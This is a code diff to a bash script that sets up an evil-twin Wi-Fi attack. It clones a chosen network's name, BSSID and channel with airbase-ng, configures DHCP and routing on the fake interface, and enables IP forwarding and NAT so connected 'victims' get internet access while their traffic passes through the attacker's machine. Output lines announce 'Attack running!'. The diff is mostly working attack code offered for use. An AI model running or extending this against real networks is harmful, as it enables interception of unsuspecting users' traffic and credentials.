@@ -26,7 +26,7 @@ DEFAULT_FOREGROUND_COLOR='\e[39m'   # Default foreground color.
 # Variables.
 TMP_DIR="./tmp/"
 
-# Network variables.
+# Real LAN network variables.
 IP_SUBNET=192.168.1.0
 IP_MASK=255.255.255.0
 IP_BROADCAST=192.168.1.255
@@ -34,6 +34,15 @@ IP_ROUTER=192.168.1.1
 IP_RANGE_START=192.168.1.20
 IP_RANGE_END=192.168.1.60
 DNS=8.8.8.8
+
+# Fake AP network variables.
+AP_SUBNET=192.168.3.0
+AP_MASK=255.255.255.0
+AP_BROADCAST=192.168.3.255
+AP_ROUTER=192.168.3.1
+AP_RANGE_START=192.168.3.20
+AP_RANGE_END=192.168.3.60
+
 DHCPD_FILE="dhcpd.conf"
 
 ###########################################
@@ -293,19 +302,20 @@ get_interfaces_chipsets() {
 ###########################################
 create_dhcpd_config_file() {
     local file_path="${TMP_DIR}/${DHCPD_FILE}"
-    rm file_path
-    echo ${file_path}
+    mkdir -p "${TMP_DIR}"
+    rm -f "${file_path}"
     {
         echo -e "authoritative;"
         echo -e "default-lease-time 600;"
         echo -e "max-lease-time 7200;"
-        echo -e "subnet ${IP_SUBNET} netmask ${IP_MASK} {"
-        echo -e "\toption broadcast-address ${IP_BROADCAST};"
-        echo -e "\toption routers ${IP_ROUTER};"
-        echo -e "\toption subnet-mask ${IP_MASK};"
-        echo -e "\trange ${IP_RANGE_START} ${IP_RANGE_END};"
+        echo -e "option domain-name-servers ${DNS};"
+        echo -e "subnet ${AP_SUBNET} netmask ${AP_MASK} {"
+        echo -e "\toption broadcast-address ${AP_BROADCAST};"
+        echo -e "\toption routers ${AP_ROUTER};"
+        echo -e "\toption subnet-mask ${AP_MASK};"
+        echo -e "\trange ${AP_RANGE_START} ${AP_RANGE_END};"
         echo -e "}"
-    } >> ${file_path}
+    } > "${file_path}"
 }
 
 ###########################################
@@ -623,30 +633,31 @@ main() {
 
             case "${menu_selection}" in
                 "1")
-                    select_interface
-                    echo "${wlan}"
-                    sleep 1
-                    select_wifi ${wlan}
-                    echo "${selected_essid} ${selected_bssid} ${selected_channel}"
-                    sleep 1
-                    select_internet_interface
-                    echo "${lan}"
-                    # TODO(ugnelis): remove "_TEST".
+                    clear
+                    print_header
+                    echo ""
+                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point...${WHITE}"
                     open_terminal "airbase-ng -e ${selected_essid} -a ${selected_bssid} -c ${selected_channel} ${wlan}" "Fake Access Point"
-                    # open_terminal "airbase-ng -e ${selected_essid}_TEST -a ${selected_bssid} -c ${selected_channel} ${wlan}" "Fake Access Point"
-                    sleep 2
-                    echo 12345
+                    sleep 3
+
+                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Configuring network for victims...${WHITE}"
+                    create_dhcpd_config_file
+
+                    ifconfig at0 up
+                    ifconfig at0 ${AP_ROUTER} netmask ${AP_MASK}
+                    route add -net ${AP_SUBNET} netmask ${AP_MASK} gw ${AP_ROUTER}
+
                     iptables -P FORWARD ACCEPT
                     echo "1" > /proc/sys/net/ipv4/ip_forward
                     iptables -t nat -A POSTROUTING -o "${lan}" -j MASQUERADE
-                    # TODO(ugnelis): provide internet access
-                    # ifconfig at0 up
-                    # ifconfig at0 192.168.3.1 netmask 255.255.255.0
-                    # route add -net 192.168.3.0 netmask 255.255.255.0 gw 192.168.3.1
-                    # TODO(ugnelis): here might be a problem.
-                    iptables -A INPUT -p icmp --icmp-type 8 -s ${IP_SUBNET}/${IP_MASK} -d ${IP_ROUTER}/${IP_MASK} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
-                    iptables -A INPUT -s ${IP_SUBNET}/${IP_MASK} -d ${IP_ROUTER}/${IP_MASK} -j DROP
-                    open_terminal "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" ${lan} 2>&1 | tee -a ${TMP_DIR}/clts.txt" "DHCP"
+                    iptables -A INPUT -p icmp --icmp-type 8 -s ${AP_SUBNET}/${AP_MASK} -d ${AP_ROUTER}/32 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+                    iptables -A INPUT -s ${AP_SUBNET}/${AP_MASK} -d ${AP_ROUTER}/32 -j DROP
+
+                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
+                    open_terminal "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "DHCP"
+                    echo ""
+                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
+                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Internet access: ${BOLD_YELLOW}Enabled${WHITE}"
                     sleep 2
                     ;;
                 "2")
